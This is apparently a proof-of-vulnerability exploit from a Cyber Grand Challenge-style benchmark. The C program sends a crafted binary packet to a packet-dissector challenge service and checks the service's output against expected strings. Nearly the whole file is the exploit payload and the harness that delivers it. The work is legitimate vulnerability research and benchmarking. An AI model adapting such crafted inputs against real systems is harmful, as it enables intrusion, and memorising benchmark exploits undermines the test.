#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\xfd\x07\x5f\xe6"
         "\x59\x42\xad\xf9\xd8\xf0\x5f\x44\x2e\x01\x00\x00\x5f\x94\xa4\xc6"
         "\x55\x69\x99\x57\x60\x00\xb8\xf4\x15\xdd\x95\x57\x1f\xf1\x39\x1f"
         "\xcb\xc0\x64\x3d\x76\x75\xec\xe5\xe2\x31\xdf\x60\x63\x92\x94\x12"
         "\x2f\x33\xcb\x4f\x90\xc8\x16\x87\xa3\xd2\x3f\x9e\x7d\xe2\x82\x54"
         "\x5c\xe1\x5e\x10\xab\xca\xf4\x7f\x1e\xd4\x5a\x3e\x9c\x1c\xcb\x20"
         "\xc7\x6c\xe6\x7a\x27\x21\x72\x55\xbd\xc1\x53\x4a\xb9\x04\xf2\x0c"
         "\x0a\x20\xa7\xd5\x87\x7a\x2c\x25\xaf\x70\x20\x75\xe3\x88\x04\x04"
         "\x57\xb8\x6c\x70\xf4\xa8\x01\xc2\xb1\x44\x57\xb7\x24\x2b\x1e\x35"
         "\x0b\xda\x48\xc3\xf0\x92\xc6\x87\x6b\xbd\x6f\x2f\xf4\x9e\x0a\xdd"
         "\xfc\x9c\x09\x6f\x40\x26\x38\xfd\x14\x1e\xd2\x0e\x8a\x44\xcd\xd2"
         "\x96\xe7\x66\xd8\x96\x72\x52\xa0\xd9\x5f\x6b\x7f\x1d\x12\x64\x20"
         "\xe2\x44\x00\xa8\x20\xac\x11\x7b\x4e\xf7\x79\x19\x0f\x08\xa0\x5a"
         "\x87\xc4\xb3\xc4\x18\x60\x63\x8a\x19\x8b\x69\x59\xbe\x7c\x06\x3c"
         "\xf7\xaf\x62\x35\x87\x4c\x3d\xe0\x8c\xf0\x31\xa4\xe7\x56\x3d\x46"
         "\xe2\x33\x80\x66\xee\x71\x0e\x58\xc3\x97\xc8\x5e\x29\x00\xf7\xc7"
         "\xe1\x5a\xd3\xef\x84\xbd\x1c\x1a\xc8\x7e\x83\x62\xb9\x15\x5b\x39"
         "\xab\x7f\x6c\xc4\x08\xa8\x75\x7b\x40\x3a\x7a\x18\x3e\x77\xf2\xa7"
         "\x67\xed\x0e\xbf\x9c\xf0\xe3\x91\x8d\x5b\xaf\xb2\x5c\x11\xda\x39"
         "\x03\x98\xab\xe8\x42\x75\xae\xa4\x9c\xf1\xaf\xa1\x5a\xa2\x2a\x77"
         "\x77\xa6\x48\x71\x7a\xc0\xbe\xfb\xc1\xb0\x34\xf4\xb2\xf5\xc7\x81"
         "\x31\x25\x6e\xa5\x3e\x8e\x4c\x65\x26\x7c\x30\xd7\xee\x50\x93\xc4"
         "\x6b\x9e\xe1\x06\x0e\x96\x32\xc2\x1f\xe6\x61\x7b\xa6\x58\x9e\x2e"
         "\x43\x29\xad\xa9\x66\x52\xe3\x2c\xc9\x72\x2b\x98\x82\xc9\x22\x17"
         "\x28\x83\x22\x88\xc3\xfd\xfc\x02\xb9\xfd\xba\x5e\xfd\x2a\xeb\x1b"
         "\x49\x3c\x51\x6b\x5f\xcc\x11\x8c\x08\x0e\xad\x15\xbc\x1b\x4e\xc8"
         "\xbd\xf5\x66\xc3\xe4\xce\x79\xa3\x07\x33\x93\xe3\xa3\xb8\x85\x45"
         "\xae\xda\x0a\x01\x8c\x49\x66\xdb\x0f\xb1\xdf\xe0\x49\xc4\x61\xc3"
         "\xf6\x88\x55\x72\x68\x8e\xa4\x94\xc3\x6e\x63\x7c\x08\x63\xe9\xcb"
         "\x10\xde\x81\x24\x91\x8a\x25\xf9\x75\xd3\x76\xda\x40\xd8\x48\xf1"
         "\x33\x1c\x49\x31\xde\xba\x8e\x72\x03\x52\x46\x13\x72\x25\xae\x77"
         "\xf5\x41\x93\xac\xaa\x4e\x63\x97\x32\xeb\x08\x47\xaf\x29\x00\xca"
         "\xce\x76\x3a\x25\x78\x30\xf2\xac\xfe\xa6\xec\x9e\x48\xbb\x64\xe1"
         "\x1f\xb7\x97\xb3\xb7\x87\xfe\xe0\xfd\xc5\x32\xd5\x9b\xe5\x08\xec"
         "\x14\x55\x5f\x92\x99\xf1\xdb\x52\xae\xa4\xaf\xc1\x50\x4f\x5f\x79"
         "\xaa\xd2\x83\x2c\xcf\x0a\x71\xe0\xb9\x66\x1a\x13\xa6\xf8\xba\xcb"
         "\x4c\x5d\x61\x41\xea\xcb\x32\xc2\x24\x87\x69\xc9\x17\x76\x8c\x87"
         "\x2c\x73\xd3\xd9\x4d\x3e\x3b\xec\xce\x75\x09\xaf\xb1\x7a\x7e\x7d"
         "\xb0\x90\x5c\xee\x0d\x52\x5e\x76\x83\xb1\x7d\xdb\x80\x92\x14\xb9"
         "\x7c\xab\x33\x3b\x01\x10\x98\xfa\xc5\x3c\xa8\xb4\x38\xce\xf6\x17"
         "\x1b\xa5\x65\x80\x50\x4f\x2e\x07\xea\x5d\x50\xc0\x02\x26\xa7\xa0"
         "\xd1\xf6\x16\xa1\x88\x1d\x80\x63\x01\x2f\xf7\x0d\x18\xdd\x77\x21"
         "\xaa\x3e\x54\xc3\x9e\xaa\x5e\xdb\xe4\x13\x58\xee\xde\x7f\x02\x07"
         "\x22\x6f\xb4\xc7\xdb\x61\x23\x4f\x82\xdd\x5b\xeb\xcb\xbb\xa2\x84"
         "\x00\x98\x46\xd5\x4a\xdf\x26\x78\x2a\x0a\x6e\xc2\x29\x84\x1a\xe4"
         "\x76\x28\xdd\xce\xb5\x29\x00\x69\xcd\x29\x00\x9c\xbb\xb8\xe4\x0f"
         "\x98\x42\x5e\xb7\xf6\x10\x8e\x97\x73\x3d\x29\x56\xea\xa4\x84\xe0"
         "\x9b\x3d\x81\xa0\x0b\x53\xa2\x09\xd6\x7f\x43\x6e\xca\x01\xab\xc5"
         "\xd9\x31\xa1\x02\xd4\x33\x9c\x0c\x1c\xb3\x29\x3d\x28\x36\x9a\x70"
         "\x7a\xc9\x00\x8b\xf5\x83\x6f\x3e\x77\x4b\xf7\x40\x81\x27\x8a\x06"
         "\x6a\xdf\x29\x71\x2e\xc3\x80\xcb\x96\x16\x9d\xc0\x65\x45\xdd\x58"
         "\xec\x0c\x9d\xc0\x3d\x31\xac\xa8\xcf\x35\x9a\x9d\xaa\xc6\x1d\xe8"
         "\xb1\x67\x46\x96\x8c\xc1\x55\xdc\xb1\xf5\x0e\xd0\x66\xd3\x70\x15"
         "\x86\xd2\x0b\x24\x1b\xe6\x8d\x65\xa9\xbe\x12\x9f\xa8\xb2\x54\x7d"
         "\x2d\xf9\x78\x31\xee\xba\x5d\x31\x94\xc2\xe5\x25\xae\xcc\x81\x94"
         "\xc9\xef\x17\xb6\x7e\x99\x82\x99\x34\xcc\xbb\xad\xc7\xd4\x37\x4c"
         "\x56\xc8\xa4\x44\xda\xca\xb3\x36\x4c\x93\x6e\xd1\x23\x46\x0b\xb7"
         "\x76\x0a\x5e\x11\xb6\xfe\x99\xaf\x31\x98\x0f\x64\x3f\xab\xeb\x55"
         "\x0b\x5a\x69\x9d\x77\x56\x18\xc3\x32\x68\x38\x99\x57\x95\x15\x20"
         "\xed\xbc\x6c\x97\xb8\x91\x09\x1c\xb6\xab\x9f\xfd\x84\xb7\xd4\x4c"
         "\x7f\x59\x4d\x2b\x0b\xd5\xa8\xf4\xd8\x51\x22\xe6\x24\x6d\x29\xb0"
         "\x70\x5e\x04\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===indecencyjimply
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x69\x6e\x64\x65\x63\x65\x6e\x63\x79\x6a\x69"
         "\x6d\x70\x6c\x79";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
